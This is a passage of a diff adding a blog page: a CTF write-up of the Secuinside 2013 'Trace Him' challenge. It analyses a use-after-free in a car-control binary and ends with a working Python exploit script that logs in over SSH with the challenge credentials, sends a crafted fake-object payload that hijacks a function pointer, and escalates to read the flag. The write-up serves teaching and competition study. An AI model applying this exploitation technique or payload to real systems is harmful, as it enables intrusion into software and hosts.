@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>[Secuinside CTF 2013]Trace Him Writeup</title>
+  <meta name="description" content="Description:">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">[Secuinside CTF 2013]Trace Him Writeup</h4>
+    <p class="post-meta">May 27, 2013 • suto</p>
+  </header>
+
+  <article class="post-content">
+    <p><em><span style="text-decoration: underline">Description:</span></em></p>
+
+<p><em><span style="text-decoration: underline"> </span></em></p>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">IP : 59.9.131.155</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">port : 18562 (SSH)</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">account :  control  / control porsche</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">binary : http://war.secuinside.com/files/firmware</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">data : http://war.secuinside.com/files/car.bin</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">hint :</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">root@ubuntu:~# uname -a</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">The evil group is running away by a car who stole personal information of BHBank.</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">The car has feature that you could do like &#8220;remote desktop.&#8221;</span></em>
+</div>
+
+<div style="width: 1px;height: 1px;overflow: hidden">
+  <em><span style="text-decoration: underline">You can find a vulnerability and stop the car. Get the evil!</span></em>
+</div>
+
+<blockquote>
+  <p>IP : 59.9.131.155</p>
+
+  <p>port : 18562 (SSH)</p>
+
+  <p>account :  control  / control porsche</p>
+
+  <p>binary : http://war.secuinside.com/files/firmware</p>
+
+  <p>data : http://war.secuinside.com/files/car.bin</p>
+
+  <p>(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)</p>
+
+  <p>hint :</p>
+
+  <p>root@ubuntu:~# uname -a</p>
+
+  <p>Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux</p>
+
+  <p>The evil group is running away by a car who stole personal information of BHBank.</p>
+
+  <p>The car has feature that you could do like “remote desktop.”</p>
+
+  <p>You can find a vulnerability and stop the car. Get the evil!</p>
+</blockquote>
+
+<p>When login to with ssh credential provided, we’ll get a car’s control interface look like:<br />
+<img class="alignnone" src="http://img441.imageshack.us/img441/9483/74587496.png" alt="" width="457" height="800" /><br />
+Using arrow keys to mov “O” around. Now look at the binary we can know how to control this car.<br />
+Go to sub_804B01C function we can see a simple switch/case looks like:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">switch ( recvChr )
+    {
+    case '1':
+     ..........
+    case '2':
+     .........
+    case 'A':
+     .......
+    case 'B':
+     .......
+    case 'D':
+     .......
+    case 'C':
+     .......
+    case ' ':
+     .......
+    default:
+}
+</pre>
+
+<p>Using these keys we can playing with feature that interface provided. When navigate the “O” to the “@” position,press [SPACE] , it will provide 3 options look like:<br />
+<img class="alignnone" src="http://img7.imageshack.us/img7/1090/54551606.png" alt="" width="384" height="800" /><br />
+Let go to the binary and find out how it implemented. Take a look at function sub_0804902B:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">obj_1 = (obj_1 *)malloc(52u);
+  memset(obj_1, 0, 0x34u);
+  obj_1-&gt;indi = '+';
+  obj_1-&gt;flag_1 = 12;
+  obj_1-&gt;flag_2 = 5;
+  obj_1-&gt;flag_3 = 8;
+  obj_1-&gt;handle = (int)f_handle;
+  obj_1-&gt;window = (int)&amp;obj_1-&gt;case1;
+  obj_1-&gt;case1 = (int)case1_1;
+  obj_1-&gt;case2 = (int)case1_2;
+  obj_1-&gt;case3 = (int)case1_3;
+  obj_1-&gt;str1 = (int)&nLockDoor;
+  obj_1-&gt;str2 = (int)&unLockDoor;
+  obj_1-&gt;str3 = (int)&Detach;
+  obj_1-&gt;str4 = (int)&off_804D094;
+</pre>
+
+<p>Here I have created a struct for that obj, we can clearly see it creates 5 obj which is corresponding to  5 positions with “@”. When navigating the “O” to a position with “@” and press [SPACE] it will be proceeded in switch/case we have seen above:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">case ' ':
+        if ( curPos == '@' )
+        {
+          mvwprintw(v15, 8, 5, "%x %x %x %x", v4, v5);
+          wrefresh(v15);
+          if ( var_window )
+            v4 = var_window-&gt;_cury;&lt;/code&gt;
+          else
+            v4 = -1;
+          if ( var_window )
+            v5 = var_window-&gt;_curx;
+          else
+            v5 = -1;
+          do_f_((int)var_window, v15, v9, v4, v5);
+          v12 = 1;
+        }
+        break;
+</pre>
+
+<p>Take a look at function do_f_:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">if ( a3 == '@' )
+  {
+    for ( i = 0; i &lt;= 5; ++i )
+    {
+      v8 = *(&amp;gObject_array + i);
+      if ( cury - 1 == (char)v8-&gt;flag_1 &amp;&amp; (char)v8-&gt;flag_2 == curx )
+      {
+        indi = (char)v8-&gt;indi;
+        break;
+      }
+    }
+</pre>
+
+<p>First the code will loop through 5 objects and check if the object-&gt;flag1 and object-&gt;flag2 are correct, if matched it will set current object to that address. Something weird here can be abused: if there is memory with correct flag1 and flag2, the code will blindly accept it as an valid object.<br />
+Next part of code is calling the handle function in object with specific parameters:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">switch ( indi )
+    {
+      case '+':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
+                   (*(&amp;gObject_array + i))-&gt;window,
+                   *(&amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case ',':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
+                   (*(&amp;gObject_array + i))-&gt;window,
+                   *(&amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '-':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
+                   (*(&amp;gObject_array + i))-&gt;window,
+                   *(&amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '.':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
+                   (*(&amp;gObject_array + i))-&gt;window,
+                   *(&amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '/':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))[2].flag_3)(
+                   (*(&amp;gObject_array + i))[1].indi,
+                   *(&amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      default:
+        return result;
+    }
+</pre>
+
+<p>So now the time to go to handle function and see what happen there:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">v8 = *(void (__cdecl **)(_DWORD, _DWORD))a2[13];
+  v9 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 4);
+  v10 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 8);
+_ch = (char)wgetch(a4);
+  switch ( _ch )
+  {
+    case '2':
+      v9(a3, a4);
+      break;
+    case '3':
+      v10(a3, a4);
+      break;
+    case '1':
+      v8(a3, a4);
+      break;
+    default:
+      mvwprintw(a4, 12, 1, "Wrong");
+      wrefresh(a4);
+      break;
+  }
+</pre>
+
+<p>v8,v9,v10 is function pointer case1,case2,case3 to handle user’s choice. Take a quick look at all functions that handle user’s choice, I found the interesting one is all “Detach” functions share the same code that frees the object but not clear the pointer in object_array.<br />
+And another bug introduced in binary was out of bounds read/write. I will let u find that one, it makes me confuse a little bit about attack vector and finally I do something like:</p>
+
+<ol>
+  <li>Free an object to get a “dangling pointer” in object_array (make sure it is not the last one in object_array).  </li>
+  <li>Reallocate that pointer with string we can control the content (so we can fool program with fake indi( “+”,”.”,”,”,”/” ) and fake flag1,flag2.  </li>
+  <li>Trigger the handle function, when it loops through the object_array it will think our fake object is correct object, then calls the handle function of that object via offset  </li>
+  <li>41414141 ( Kab00m)</li>
+</ol>
+
+<p>To visualize the exploit steps, here is the object_array during exploitation:<br />
+0x804d380:<br />
+[Door Object Pointer][Rapair Object Pointer][Front Missle Object Pointer][Rare Object Pointer][Rear Object Pointer]</p>
+
+<p>*First we Detach Front Missle Object Pointer so it will become:<br />
+0x804d380:<br />
+[Door Object Pointer][Rapair Object Pointer][Pointer to Freed memory size 0x34][Rare Missle Object Pointer][Rear Object Pointer]<br />
+<img class="alignnone" src="http://img191.imageshack.us/img191/3107/19012399.png" alt="" width="400" height="800" /><br />
+*Reallocate that memory with Repair Object Comment so it will look like:<br />
+[Door Object Pointer][Rapair Object Pointer][Pointer to Content ( AAAAAAAAAAA) ][Rare Missle Object Pointer][Rear Object Pointer]<br />
+<img class="alignnone" src="http://img19.imageshack.us/img19/5749/89539837.png" alt="" width="380" height="800" /><br />
+Of course in exploitation we will replace “AAAA…” with string looks like a correct Rare Object.</p>
+
+<p>*Call Rare Missle Object handle function</p>
+
+<p>Finally, exploit code :</p>
+
+<pre class="brush: python; title: ; notranslate" title="">from pexpect import spawn
+import time
+
+child = spawn('ssh -p 18562 control@59.9.131.155')
+child.expect('password')
+
+child.sendline('control porsche')
+#child = spawn("./por")
+
+KEY_UP = 'x1b[A'
+KEY_DOWN = 'x1b[B'
+KEY_RIGHT = 'x1b[C'
+KEY_LEFT = 'x1b[D'
+
+child.expect('Console')
+
+child.send(KEY_RIGHT * 9)
+child.send(KEY_DOWN * 2)
+child.send(" 3")
+
+child.send(KEY_DOWN)
+child.send(KEY_LEFT * 6)
+child.send(" 1")
+child.sendline("x2dx41x41x41" +"x06x01x01x01" + "x06x01x01x01" + 'AAAAx6bx85x04x08'+"C"*28+"x40x89x04x08")
+
+child.send(" ")
+
+child.sendline("echo 'cat /home/admin/StopTheCar'|./PrivilegeEscalation")
+
+child.interact()
+</pre>
+
+<p>Actually, after getting the shell, I got a mini heart attack from organizer since the ReadMe file tells this is 2-steps challenge, it needs another local exploit. My team mate @w00d helped me to retrieve the PrivilegeEscalation binary, and it only does one thing:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_804844C()
+{
+  setreuid(0x3E8u, 0x3E8u);
+  return system("/bin/bash");
+}
+</pre>
+
+<p>It really a nice challenge to work with, thanks organizer for awesome binaries, thank all you guys from CLGT CTF team <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /><br />
+See u in next CTF.</p>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
